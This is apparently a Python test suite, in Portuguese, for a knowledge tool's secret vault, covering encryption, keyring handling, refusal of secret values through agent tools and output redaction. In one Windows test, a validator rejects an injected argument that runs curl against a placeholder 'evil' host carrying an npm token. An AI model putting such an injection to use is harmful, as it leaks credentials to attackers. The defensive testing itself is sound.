"""Segredos no cérebro: item `secret` vazio, valor preenchido pela UI, uso por `knowledge-mcp run`.

O valor nunca volta por ferramenta, rota, busca ou contexto — só `has_value`.
"""

import json
import os
import re
import subprocess
import sys
from pathlib import Path

import pytest
from fastmcp.exceptions import ToolError

from knowledge_os import config
from knowledge_os.exceptions import NotFoundError, ValidationError
from knowledge_os.services import vault
from knowledge_os.services.context_service import ContextService
from knowledge_os.services.item_service import ItemService
from knowledge_os.services.repo_service import RepoService
from knowledge_os.services.secret_guard import ensure_no_secrets
from knowledge_os.services.secret_service import SecretService
from tests.helpers_multidb import catalog  # noqa: F401
from tests.test_tools_mcp import call, server  # noqa: F401

ROOT = Path(__file__).resolve().parent.parent
VALUE = "npm_Zx81kQ2pL0aVb7Yt3Rw9Mn4C"  # não casa com nenhum padrão do secret_guard
PROJECT = "github.com/org/app"
SECRET = {"key": "segredo/npm-token", "type": "secret", "title": "Token do npm",
          "summary": "Publicar pacotes no npm"}


@pytest.fixture
def linked(test_engine):
    RepoService(test_engine).link(PROJECT, "Org", "app")
    return test_engine


def _secret(engine, **extra):
    link = RepoService(engine).require(PROJECT)
    out = ItemService(engine).save([{**SECRET, **extra}],
                                   default_location=(link["workspace_id"], link["project_id"]))
    return out[0]["id"]


# ---- cifra e chave mestra ---------------------------------------------------------------

def test_cifra_ida_e_volta_e_o_texto_cifrado_nao_contem_o_valor():
    token = vault.encrypt(VALUE, bound_to="item-1")
    assert VALUE not in token and vault.decrypt(token, bound_to="item-1") == VALUE
    with pytest.raises(ValidationError, match="outro segredo"):
        vault.decrypt(token, bound_to="item-2")


def test_sem_chave_e_com_valor_cifrado_da_erro_sem_gerar_chave(linked, monkeypatch):
    item_id = _secret(linked)
    SecretService(linked).set_value(item_id, VALUE)
    monkeypatch.delenv(vault.ENV_KEY)
    created = []
    monkeypatch.setattr(vault, "_keyring_get", lambda: None)
    monkeypatch.setattr(vault, "_keyring_set", lambda key: created.append(key))
    with pytest.raises(ValidationError, match="chave mestra"):
        SecretService(linked).set_value(item_id, "outro")
    assert created == []


def test_primeiro_segredo_gera_a_chave_no_keyring(linked, monkeypatch):
    monkeypatch.delenv(vault.ENV_KEY)
    store = {}
    monkeypatch.setattr(vault, "_keyring_get", lambda: store.get("k"))
    monkeypatch.setattr(vault, "_keyring_set", lambda key: store.update(k=key))
    item_id = _secret(linked)
    SecretService(linked).set_value(item_id, VALUE)
    assert store["k"] and SecretService(linked).resolve(PROJECT, "segredo/npm-token")[1] == VALUE


# ---- agente cria vazio; nada devolve o valor -------------------------------------------

def test_item_save_cria_segredo_vazio_e_devolve_o_link(server):  # noqa: F811
    call(server, "repo", action="link", repo=PROJECT, workspace="Org", project="app")
    out = call(server, "item_save", repo=PROJECT, items=[SECRET])[0]
    assert out["action"] == "created" and out["has_value"] is False
    assert out["fill_url"].startswith("http://127.0.0.1:8765/ui/#/c/default/w/")
    assert out["fill_url"].endswith(f"/i/{out['id']}")


@pytest.mark.parametrize("field", ["value", "valor"])
def test_item_save_recusa_o_valor_sem_ecoar(server, field):  # noqa: F811
    call(server, "repo", action="link", repo=PROJECT, workspace="Org", project="app")
    with pytest.raises(ToolError) as exc:
        call(server, "item_save", repo=PROJECT, items=[{**SECRET, field: VALUE}])
    assert "UI" in str(exc.value) and VALUE not in str(exc.value)


def test_nenhuma_leitura_devolve_o_valor(linked):
    item_id = _secret(linked)
    SecretService(linked).set_value(item_id, VALUE)
    items = ItemService(linked)
    from knowledge_os.schemas.item_schemas import ItemResponse

    got = ItemResponse.from_item(items.get(item_id)).model_dump(mode="json")
    assert got["has_value"] is True and VALUE not in json.dumps(got)
    assert VALUE not in json.dumps(items.search(None, None, "npm", limit=5), default=str)
    md = ContextService(linked).build(PROJECT)["markdown"]
    assert "Token do npm" in md and VALUE not in md
    assert "knowledge-mcp run --env" in md and "segredo/npm-token" in md


def test_contexto_mostra_o_link_quando_falta_o_valor(linked):
    _secret(linked)
    md = ContextService(linked).build(PROJECT)["markdown"]
    assert "sem valor" in md and "http://127.0.0.1:8765/ui/#/c/" in md


def test_apagar_o_item_apaga_o_valor(linked):
    item_id = _secret(linked)
    SecretService(linked).set_value(item_id, VALUE)
    ItemService(linked).delete(item_id)
    with linked.connect() as conn:
        from sqlalchemy import text

        assert conn.execute(text("SELECT count(*) FROM secret_values")).scalar() == 0


def test_segredo_com_valor_nao_vira_outro_tipo(linked):
    item_id = _secret(linked)
    SecretService(linked).set_value(item_id, VALUE)
    with pytest.raises(ValidationError, match="Apague o valor"):
        ItemService(linked).update(item_id, type="knowledge")


def test_valor_so_em_item_secret(linked):
    link = RepoService(linked).require(PROJECT)
    rid = ItemService(linked).save(
        [{"key": "regra/x", "type": "rule", "title": "X", "summary": "s", "content": "c"}],
        default_location=(link["workspace_id"], link["project_id"]))[0]["id"]
    with pytest.raises(ValidationError, match="secret"):
        SecretService(linked).set_value(rid, VALUE)


def test_resolve_procura_no_repo_no_geral_e_no_global(linked):
    items = ItemService(linked)
    out = items.save([{**SECRET, "workspace": "Global", "project": "Geral"}])
    SecretService(linked).set_value(out[0]["id"], VALUE)
    item, value = SecretService(linked).resolve(PROJECT, "segredo/npm-token")
    assert value == VALUE and item.id == out[0]["id"]
    assert items.get(item.id).access_count == 1  # uso conta


def test_resolve_sem_valor_aponta_o_link(linked):
    _secret(linked)
    with pytest.raises(ValidationError, match=r"sem valor.*http://127\.0\.0\.1:8765/ui/"):
        SecretService(linked).resolve(PROJECT, "segredo/npm-token")


def test_guard_ensina_o_fluxo_do_segredo():
    with pytest.raises(ValidationError, match="secret") as exc:
        ensure_no_secrets(content="token: ghp_" + "a" * 36)
    assert "ghp_" not in str(exc.value)


# ---- knowledge-mcp run ---------------------------------------------------------------------

@pytest.fixture
def cli_env(tmp_path):
    env = {**os.environ, "KNOWLEDGE_OS_HOME": str(tmp_path / "home"),
           "PYTHONPATH": str(ROOT / "src"), "LOG_LEVEL": "WARNING"}
    project = tmp_path / "app"
    (project / ".git").mkdir(parents=True)
    code = (
        "import sys\n"
        "from knowledge_os.config import ensure_home, validate_and_init_config\n"
        "ensure_home(); validate_and_init_config()\n"
        "from knowledge_os.services.item_service import ItemService\n"
        "from knowledge_os.services.repo_service import RepoService\n"
        "from knowledge_os.services.secret_service import SecretService\n"
        f"RepoService().link({str(project)!r}, 'Pessoal', 'app')\n"
        f"link = RepoService().resolve({str(project)!r})\n"
        "ids = ItemService().save([\n"
        "  {'key': 'segredo/token', 'type': 'secret', 'title': 'T', 'summary': 's'},\n"
        "  {'key': 'segredo/vazio', 'type': 'secret', 'title': 'V', 'summary': 's'}],\n"
        "  default_location=(link['workspace_id'], link['project_id']))\n"
        "SecretService().set_value(ids[0]['id'], sys.argv[1])\n"
    )
    subprocess.run([sys.executable, "-c", code, VALUE], env=env, cwd=ROOT, check=True,
                   capture_output=True, timeout=120)
    return env, project


def _run(env, project, *args):
    return subprocess.run(
        [sys.executable, "-m", "knowledge_os.cli", "run", "--repo", str(project), *args],
        env=env, cwd=ROOT, capture_output=True, text=True, encoding="utf-8", timeout=120,
    )


CHILD = (
    "import os, sys, base64, urllib.parse as u\n"
    "v = os.environ['TOKEN']\n"
    "print('valor', v); print('b64', base64.b64encode(v.encode()).decode())\n"
    "print('url', base64.urlsafe_b64encode(v.encode()).decode().rstrip('='))\n"
    "print('quote', u.quote(v + '/x', safe='')); sys.stderr.write('err ' + v + '\\n')\n"
    "print('chave-mestra', 'KNOWLEDGE_OS_VAULT_KEY' in os.environ)\n"
    "sys.exit(3)\n"
)


def test_run_injeta_redige_e_devolve_o_codigo_do_filho(cli_env):
    env, project = cli_env
    out = _run(env, project, "--env", "TOKEN=segredo/token", "--", sys.executable, "-c", CHILD)
    assert out.returncode == 3, out.stderr
    assert VALUE not in out.stdout and VALUE not in out.stderr
    assert "valor ***" in out.stdout and "err ***" in out.stderr
    for line in ("b64 ***", "url ***", "quote ***"):
        assert line in out.stdout, out.stdout
    assert "chave-mestra False" in out.stdout


def test_run_passa_o_segredo_pelo_stdin(cli_env):
    env, project = cli_env
    child = "import sys; data = sys.stdin.read(); print(len(data) == %d)" % len(VALUE)
    out = _run(env, project, "--stdin", "segredo/token", "--", sys.executable, "-c", child)
    assert out.returncode == 0 and "True" in out.stdout, out.stderr


def test_run_sem_valor_aponta_o_link_e_nao_roda(cli_env):
    env, project = cli_env
    out = _run(env, project, "--env", "X=segredo/vazio", "--", sys.executable, "-c",
               "print('rodou')")
    assert out.returncode == 1 and "rodou" not in out.stdout
    assert "sem valor" in out.stderr and "http://127.0.0.1:8765/ui/" in out.stderr


# ---- achados das revisões ------------------------------------------------------------------

def test_chave_perdida_depois_de_criada_nao_e_regerada_mesmo_com_banco_vazio(linked, monkeypatch):
    """A chave vale para todas as conexões: outro banco vazio não autoriza gerar outra."""
    monkeypatch.delenv(vault.ENV_KEY)
    monkeypatch.setattr(vault, "_keyring_get", lambda: None)
    created = []
    monkeypatch.setattr(vault, "_keyring_set", lambda key: created.append(key))
    vault._marker().parent.mkdir(parents=True, exist_ok=True)
    vault._marker().write_text("x")
    item_id = _secret(linked)
    with pytest.raises(ValidationError, match="já foi criada"):
        SecretService(linked).set_value(item_id, VALUE)
    assert created == []


def test_link_usa_a_conexao_default_configurada(linked, monkeypatch):
    import knowledge_os.services.secret_service as svc

    monkeypatch.setattr(svc, "default_connection_id", lambda: "pg-1")
    item = ItemService(linked).get(_secret(linked))
    assert "/ui/#/c/pg-1/w/" in svc.fill_url(item)


def test_segredo_sem_key_e_recusado_e_resolve_aceita_o_id(linked):
    link = RepoService(linked).require(PROJECT)
    loc = (link["workspace_id"], link["project_id"])
    with pytest.raises(ValidationError, match="precisa de key"):
        ItemService(linked).save([{"type": "secret", "title": "T", "summary": "s"}],
                                 default_location=loc)
    item_id = _secret(linked)
    SecretService(linked).set_value(item_id, VALUE)
    assert SecretService(linked).resolve(PROJECT, item_id)[1] == VALUE


@pytest.mark.parametrize("entry, match", [
    ({"Token": VALUE}, "não passa pelo agente"),
    ({"content": "outro texto"}, "não tem corpo"),
    ({"summary": "token do banco: Zk81Lm2Qp9Xw4Rt7"}, "parece conter a credencial"),
])
def test_item_save_recusa_valor_disfarcado_em_segredo(linked, entry, match):
    link = RepoService(linked).require(PROJECT)
    with pytest.raises(ValidationError, match=match) as exc:
        ItemService(linked).save([{**SECRET, **entry}],
                                 default_location=(link["workspace_id"], link["project_id"]))
    assert VALUE not in str(exc.value) and "Zk81Lm2Qp9Xw4Rt7" not in str(exc.value)


@pytest.mark.parametrize("value, match", [("abc", "curto demais"), ("ab\ud83dcd", "inválido")])
def test_set_value_recusa_curto_e_utf16_solto(linked, value, match):
    item_id = _secret(linked)
    with pytest.raises(ValidationError, match=match):
        SecretService(linked).set_value(item_id, value)


def test_valor_trocado_de_linha_no_arquivo_nao_vira_outro_segredo(linked):
    a = _secret(linked)
    b = _secret(linked, key="segredo/aws", title="AWS")
    SecretService(linked).set_value(a, VALUE)
    SecretService(linked).set_value(b, "aws-" + VALUE)
    secrets_dir = config.KNOWLEDGE_HOME / "repos" / "default" / ".secrets"
    (secrets_dir / f"{b}.enc").write_text((secrets_dir / f"{a}.enc").read_text(encoding="utf-8"),
                                          encoding="utf-8")
    with pytest.raises(ValidationError, match="outro segredo"):
        SecretService(linked).resolve(PROJECT, "segredo/aws")


def test_resolve_prefere_o_repo_ao_global(linked):
    items = ItemService(linked)
    glob = items.save([{**SECRET, "workspace": "Global", "project": "Geral"}])[0]["id"]
    SecretService(linked).set_value(glob, "global-" + VALUE)
    repo = _secret(linked)
    SecretService(linked).set_value(repo, "repo-" + VALUE)
    assert SecretService(linked).resolve(PROJECT, "segredo/npm-token")[1] == "repo-" + VALUE


def test_apagar_project_leva_o_valor(linked):
    from sqlalchemy import delete, text
    from sqlalchemy.orm import Session

    from knowledge_os.db.models import Item
    from knowledge_os.services._common import purge_item_links

    item_id = _secret(linked)
    SecretService(linked).set_value(item_id, VALUE)
    with Session(linked) as s:
        purge_item_links(s, [item_id])
        s.execute(delete(Item).where(Item.id == item_id))
        s.commit()
    with linked.connect() as conn:
        assert conn.execute(text("SELECT count(*) FROM secret_values")).scalar() == 0


# ---- ciphertext em arquivo no clone, fora do banco ------------------------------------------

def test_set_value_grava_o_ciphertext_em_arquivo_no_clone(linked):
    item_id = _secret(linked)
    SecretService(linked).set_value(item_id, VALUE)
    secret_path = config.KNOWLEDGE_HOME / "repos" / "default" / ".secrets" / f"{item_id}.enc"
    assert secret_path.is_file()
    token = secret_path.read_text(encoding="utf-8")
    assert VALUE not in token
    assert vault.decrypt(token, bound_to=item_id) == VALUE
    with linked.connect() as conn:
        from sqlalchemy import text

        cols = {row[1] for row in conn.execute(text("PRAGMA table_info(secret_values)"))}
    assert "ciphertext" not in cols


def test_primeira_gravacao_poe_secrets_no_gitignore_sem_duplicar(linked):
    item_id = _secret(linked)
    clone_path = config.KNOWLEDGE_HOME / "repos" / "default"
    SecretService(linked).set_value(item_id, VALUE)
    gitignore = (clone_path / ".gitignore").read_text(encoding="utf-8")
    assert gitignore.splitlines().count(".secrets/") == 1

    SecretService(linked).set_value(item_id, "outro-valor-com-tamanho-ok")
    gitignore = (clone_path / ".gitignore").read_text(encoding="utf-8")
    assert gitignore.splitlines().count(".secrets/") == 1


def test_clear_value_remove_o_arquivo(linked):
    item_id = _secret(linked)
    SecretService(linked).set_value(item_id, VALUE)
    secret_path = config.KNOWLEDGE_HOME / "repos" / "default" / ".secrets" / f"{item_id}.enc"
    assert secret_path.exists()
    SecretService(linked).clear_value(item_id)
    assert not secret_path.exists()


def test_resolve_com_arquivo_ausente_mas_indice_com_valor_da_erro_claro(linked):
    item_id = _secret(linked)
    SecretService(linked).set_value(item_id, VALUE)
    secret_path = config.KNOWLEDGE_HOME / "repos" / "default" / ".secrets" / f"{item_id}.enc"
    secret_path.unlink()
    with pytest.raises(NotFoundError, match="arquivo cifrado não existe"):
        SecretService(linked).resolve(PROJECT, "segredo/npm-token")


# ---- redação e execução --------------------------------------------------------------------

def _red(value):
    from knowledge_os.services.secret_run import redactor

    return redactor([value])


def test_redacao_pega_basic_auth_json_url_e_utf16():
    import base64 as b64
    import json as js
    from urllib.parse import quote

    v = 'Senha"Ação\\2024/Xy'
    redact = _red(v)
    for prefix in ("ci:", "c:", ":"):
        line = b"Authorization: Basic " + b64.b64encode((prefix + v).encode()) + b"\n"
        out = redact(line)
        assert b"***" in out, prefix
        assert b64.b64encode((prefix + v).encode()) not in out
    lower_pct = re.sub(r"%[0-9A-F]{2}", lambda m: m.group(0).lower(), quote(v, safe=""))
    for text in (js.dumps(v), js.dumps(v, ensure_ascii=False), quote(v), lower_pct):
        assert b"***" in redact(text.encode()), text
    assert v.encode("utf-16-le") not in redact(v.encode("utf-16-le"))
    assert v.encode("cp1252", errors="ignore") not in redact(v.encode("cp1252", errors="ignore"))


def test_redacao_pega_cada_linha_de_valor_multilinha():
    pem = ("-----BEGIN KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC\n"
           "qhkiG9w0BAQEFAASCBKcwggSjAgEAAoIB\n-----END KEY-----")
    out = _red(pem)(b"linha: qhkiG9w0BAQEFAASCBKcwggSjAgEAAoIB\n")
    assert b"qhkiG9w0BAQEFAASCBKcwggSjAgEAAoIB" not in out


def test_executavel_nunca_vem_da_pasta_atual(tmp_path, monkeypatch):
    from knowledge_os.services.secret_run import resolve_executable

    name = "ferramenta-plantada"
    planted = tmp_path / (name + (".cmd" if sys.platform == "win32" else ""))
    planted.write_text("@echo roubei\n" if sys.platform == "win32" else "#!/bin/sh\necho roubei\n")
    planted.chmod(0o755)
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("PATH", os.pathsep.join([".", str(tmp_path), os.environ["PATH"]]))
    with pytest.raises(ValidationError, match="não encontrado"):
        resolve_executable(name)


@pytest.mark.skipif(sys.platform != "win32", reason="cmd.exe só no Windows")
def test_cmd_bat_recusa_metacaracteres():
    from knowledge_os.services.secret_run import _check_cmd_args

    with pytest.raises(ValidationError, match="cmd.exe"):
        _check_cmd_args("C:/tools/npm.cmd", ['version', 'x" & curl evil %NPM_TOKEN%'])
    _check_cmd_args("C:/tools/npm.cmd", ["publish", "--access", "public"])


def test_run_redige_valor_com_acento_escrito_em_cp1252(cli_env, tmp_path):
    env, project = cli_env
    child = ("import os, sys; sys.stdout.reconfigure(encoding='cp1252');"
             "print('v=' + os.environ['T'])")
    code = (
        "import sys\n"
        "from knowledge_os.config import ensure_home, validate_and_init_config\n"
        "ensure_home(); validate_and_init_config()\n"
        "from knowledge_os.services.item_service import ItemService\n"
        "from knowledge_os.services.repo_service import RepoService\n"
        "from knowledge_os.services.secret_service import SecretService\n"
        f"link = RepoService().resolve({str(project)!r})\n"
        "ids = ItemService().save([{'key': 'segredo/acento', 'type': 'secret', 'title': 'A',"
        " 'summary': 's'}], default_location=(link['workspace_id'], link['project_id']))\n"
        "SecretService().set_value(ids[0]['id'], 'Senha-Ação-2024')\n"
    )
    subprocess.run([sys.executable, "-c", code], env=env, cwd=ROOT, check=True,
                   capture_output=True, timeout=120)
    out = subprocess.run(
        [sys.executable, "-m", "knowledge_os.cli", "run", "--repo", str(project),
         "--env", "T=segredo/acento", "--", sys.executable, "-c", child],
        env=env, cwd=ROOT, capture_output=True, timeout=120)
    assert out.returncode == 0, out.stderr
    assert b"v=***" in out.stdout and b"Senha" not in out.stdout


def test_run_key_inexistente_nao_roda(cli_env):
    env, project = cli_env
    out = _run(env, project, "--env", "X=segredo/nao-existe", "--", sys.executable, "-c",
               "print('rodou')")
    assert out.returncode == 1 and "rodou" not in out.stdout
    assert "não encontrado" in out.stderr
